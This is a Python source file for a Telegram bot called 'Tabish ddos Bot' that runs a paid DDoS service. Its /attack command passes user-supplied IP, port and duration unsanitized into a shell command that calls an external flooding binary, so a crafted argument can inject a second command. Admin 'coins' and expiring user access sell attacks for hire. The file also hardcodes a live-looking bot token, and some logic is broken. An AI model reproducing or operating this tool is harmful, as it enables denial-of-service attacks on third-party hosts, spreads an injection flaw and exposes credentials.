import sys
import subprocess
import threading
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

# Global variables
running = False  # Flag to track if an attack is running
cooldown_time = 0  # Global cooldown timer
admins = {}      # Dictionary to store admins and their coins
users = {}       # Dictionary to store users and their access expiry
owner_id = 1257888659  # Replace with your Telegram user ID

# Function to check if a user is an admin or the owner
def is_authorized(user_id):
    return user_id == owner_id or user_id in admins

# Start command handler
async def start(update: Update, context: CallbackContext):
    await update.message.reply_text(
        "Welcome to Tabish ddos Bot!\n"
    )

# Attack command handler
async def attack(update: Update, context: CallbackContext):
    global running, cooldown_time

    # Check if the user is authorized
    user_id = update.message.from_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("You are not authorized to use this command.")
        return

    if running:
        await update.message.reply_text("An attack is already running. Use /stop to stop it.")
        return

    # Check global cooldown
    if time.time() < cooldown_time:
        await update.message.reply_text(f"Cooldown active. Please wait {int(cooldown_time - time.time())} seconds.")
        return

    # Parse command arguments
    try:
        target = context.args[0]
        port = int(context.args[1])
        attack_time = int(context.args[2])
    except (IndexError, ValueError):
        await update.message.reply_text(
            "Invalid command format.\n"
            "Usage: /attack <ip> <port> <duration>\n"
        )
        return

    # Start the attack using the binary executable
    running = True
    await update.message.reply_text(f"Starting attack on {target}:{port}...")

    def run_attack():
        global running, cooldown_time
        try:
            # Construct the command to call the binary
            full_command = f"./sun {target} {port} {attack_time} 1000"
            process = subprocess.run(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            # Check if the attack was successful
            if process.returncode == 0:
                response = f"Attack Finished. Target: {target} Port: {port} Time: {attack_time}"
            else:
                response = f"Attack Failed. Error: {process.stderr.decode().strip()}"
        except Exception as e:
            response = f"Error: {e}"
        finally:
            running = False
            cooldown_time = time.time() + 90  # Set cooldown to 5 minutes
            context.bot.send_message(chat_id=update.message.chat_id, text=response)

    # Run the attack in a separate thread
    threading.Thread(target=run_attack).start()

# Stop command handler
async def stop(update: Update, context: CallbackContext):
    global running

    # Check if the user is authorized
    user_id = update.message.from_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("You are not authorized to use this command.")
        return

    if not running:
        await update.message.reply_text("No attack is currently running.")
        return

    # Stop the attack
    running = False
    await update.message.reply_text("Attack stopped.")

# Add admin command handler
async def add_admin(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id

    # Only the owner can add admins
    if user_id != owner_id:
        await update.message.reply_text("You are not authorized to add admins.")
        return

    try:
        admin_id = int(context.args[0])
        coins = int(context.args[1])
        admins[admin_id] = coins
        await update.message.reply_text(f"Admin added with ID {admin_id} and {coins} coins.")
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /addadmin <admin_id> <coins>")

# Add user command handler
async def add_user(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id

    # Only admins can add users
    if not is_authorized(user_id):
        await update.message.reply_text("You are not authorized to add users.")
        return

    try:
        user_id = int(context.args[0])
        duration = int(context.args[1])
        unit = context.args[2].lower()

        # Calculate expiry time
        current_time = time.time()
        if unit == "days":
            expiry_time = current_time + (duration * 86400)
        elif unit == "hours":
            expiry_time = current_time + (duration * 3600)
        elif unit == "months":
            expiry_time = current_time + (duration * 2592000)  # Approximate 30 days per month
        else:
            await update.message.reply_text("Invalid unit. Use 'days', 'hours', or 'months'.")
            return

        # Deduct coins from admin
        if admins[user_id] < duration:
            await update.message.reply_text("Insufficient coins.")
            return
        admins[user_id] -= duration

        # Add user
        users[user_id] = expiry_time
        await update.message.reply_text(f"User {user_id} added with access until {time.ctime(expiry_time)}.")
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /adduser <user_id> <duration> <unit>")

# Check access command handler
async def check_access(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id

    if user_id in users and time.time() < users[user_id]:
        await update.message.reply_text(f"Your access is valid until {time.ctime(users[user_id])}.")
    else:
        await update.message.reply_text("You do not have access.")

# Main function
def main():
    # Replace 'YOUR_BOT_TOKEN' with your actual bot token
    bot_token = "6098885239:AAEuCEZu6O_BYl8yxp7ryIWp4i1Y6CN_5Fo"

    # Set up the bot
    application = Application.builder().token(bot_token).build()

    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("addadmin", add_admin))
    application.add_handler(CommandHandler("adduser", add_user))
    application.add_handler(CommandHandler("checkaccess", check_access))

    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()